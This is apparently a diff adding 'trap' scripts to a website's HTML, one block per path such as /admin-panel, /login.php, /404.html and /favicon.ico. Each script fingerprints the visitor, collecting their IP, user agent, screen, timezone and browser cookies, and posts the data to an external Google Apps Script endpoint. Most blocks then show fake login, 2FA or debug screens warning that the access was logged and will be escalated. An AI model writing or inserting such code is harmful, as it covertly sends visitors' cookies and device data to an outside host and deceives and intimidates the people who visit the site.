+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/admin-panel",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+
+        // Fake interface
+        document.body.innerHTML = `
+          <div style="background:#000;color:#88c0d0;font-family:monospace;padding:2rem;text-align:center;">
+            <h2>🔐 RUAH INTERNAL DASHBOARD</h2>
+            <p>Access to this system requires 2FA validation.</p>
+            <p>IP Logged: <strong>${data.ip}</strong></p>
+            <p style="margin-top:2rem;">Please enter the dynamic token generated by your secure authenticator app:</p>
+            <input type="password" disabled value="••••••" style="margin-top:1rem;padding:0.5rem;font-size:1.1rem;background:#111;border:1px solid #444;color:#ccc;">
+            <p style="color:#f55;margin-top:2rem;">⚠️ Access Denied: Invalid Token</p>
+            <p style="margin-top:2rem;font-size:0.85rem;color:#777;">This activity has been logged and forwarded to system administrator.</p>
+          </div>
+        `;
+      });
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  board trap -->
+
+<script>
+(function(){
+  if (window.location.pathname === "/Board") {
+    document.cookie = "board_visited=true; path=/; max-age=2592000";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/Board",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+
+        // Fake Board Interface
+        document.body.innerHTML = `
+          <div style="background:#000;color:#c3f0c8;font-family:monospace;padding:2rem;text-align:center;">
+            <h2>📁 BOARD ACCESS INTERFACE</h2>
+            <p>Welcome to Ruah Governance Node.</p>
+            <p style="margin-top:1rem;">Internal record last viewed from IP:</p>
+            <h3 style="color:#ff7;">${data.ip}</h3>
+            <p>Access verified: <strong>${new Date().toLocaleString()}</strong></p>
+            <p style="margin-top:2rem;color:#f55;">⚠️ This access has been recorded and will be escalated.</p>
+          </div>
+        `;
+      });
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  /404.html trap -->
+
+
+
+<script>
+(function(){
+  if (window.location.pathname === "/404.html") {
+    document.cookie = "trap404_visited=true; path=/; max-age=2592000";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/404.html",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+
+        // Fake Debug Console
+        document.body.innerHTML = `
+          <div style="background:#111;color:#7fcf7f;font-family:monospace;padding:2rem;text-align:center;">
+            <h2>🚫 DEBUG LOG – 404 TRACE MODE</h2>
+            <p>Invalid URL accessed by: <strong>${data.ip}</strong></p>
+            <p>Agent: ${navigator.userAgent}</p>
+            <p style="margin-top:1rem;color:#ff7;">⚠️ Unauthorized probe detected.</p>
+            <p style="font-size:0.9rem;margin-top:2rem;">This access attempt has been logged.</p>
+            <p style="font-size:0.7rem;color:#667;">(Internal surveillance system v1.4)</p>
+          </div>
+        `;
+      });
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  /, trap -->
+
+
+
+<script>
+(function(){
+  const path = window.location.pathname;
+
+  // Fix malformed /, by redirecting it cleanly
+  if (path === "/,") {
+    window.location.replace("/");
+    return;
+  }
+
+  // Trap for homepage (normal and malformed)
+  if (path === "/") {
+    // Drop cookie
+    document.cookie = "home_visited=true; path=/; max-age=2592000";
+
+    // Collect fingerprint and log
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+      });
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  /login.php trap -->
+
+
+
+<script>
+(function(){
+  if (window.location.pathname === "/login.php") {
+    document.cookie = "loginphp_visited=true; path=/; max-age=2592000";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/login.php",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+
+        // Fake login screen
+        document.body.innerHTML = `
+          <div style="background:#000;color:#c3f0c8;font-family:monospace;padding:2rem;text-align:center;">
+            <h2>🔒 AUTH PORTAL</h2>
+            <p>Staff Login Required</p>
+            <input type="text" placeholder="Username" disabled style="margin:1rem;padding:0.5rem;width:220px;background:#111;border:1px solid #555;color:#888;"><br>
+            <input type="password" placeholder="Password" disabled style="padding:0.5rem;width:220px;background:#111;border:1px solid #555;color:#888;"><br>
+            <button disabled style="margin-top:1rem;padding:0.6rem 2rem;background:#222;color:#aaa;border:none;">Login</button>
+            <p style="margin-top:2rem;color:#f55;">⚠️ Unauthorized Access. Logged and Reported.</p>
+          </div>
+        `;
+      });
+  }
+})();
+
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  /images/parked-on-the-bun.png trap -->
+
+
+
+<script>
+(function(){
+  if (window.location.pathname === "/images/parked-on-the-bun.png") {
+    document.cookie = "bun_visited=true; path=/; max-age=2592000";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/images/parked-on-the-bun.png",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+
+        // Visual fallback (optional)
+        document.body.innerHTML = `
+          <div style="background:#000;color:#7fcf7f;font-family:monospace;padding:2rem;text-align:center;">
+            <h2>🍔 IMG NODE ACTIVE</h2>
+            <p><code>/images/parked-on-the-bun.png</code> was accessed directly.</p>
+            <p>Your IP: <strong>${data.ip}</strong></p>
+            <p style="margin-top:2rem;color:#f55;">Logged. Possibly misused embed or deep link.</p>
+          </div>
+        `;
+      });
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+<!--  /favicon.ico trap -->
+
+<script>
+(function(){
+  if (window.location.pathname === "/favicon.ico") {
+    document.cookie = "favicon_visited=true; path=/; max-age=2592000";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const fingerprint = {
+          ip: data.ip,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timestamp: new Date().toISOString(),
+          page: "/favicon.ico",
+          email: "sharingsilence81@gmail.com",
+          cookie: document.cookie
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbw-c5T_90e4UGO_wD39M-jbYXUFaoev9g49qxkbnZNYxNJ5Hdy4g9cHs9axUiYg26dxbw/exec", {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fingerprint)
+        });
+
+        document.body.innerHTML = `
+          <div style="background:#000;color:#7fcf7f;font-family:monospace;padding:2rem;text-align:center;">
+            <h2>🧠 Favicon Probe Triggered</h2>
+            <p>IP: <strong>${data.ip}</strong></p>
+            <p style="margin-top:2rem;">This was not a browser. This was a watcher.</p>
+            <p style="color:#f55;margin-top:2rem;">Access logged.</p>
+          </div>
+        `;
+      });
+  }
+})();
+</script>
+
+
+
+<!-- END -->
+
+
+
+</body>
+</html>
+
+
+
+<!-- https://dl..dropboxusercontent.com/-->
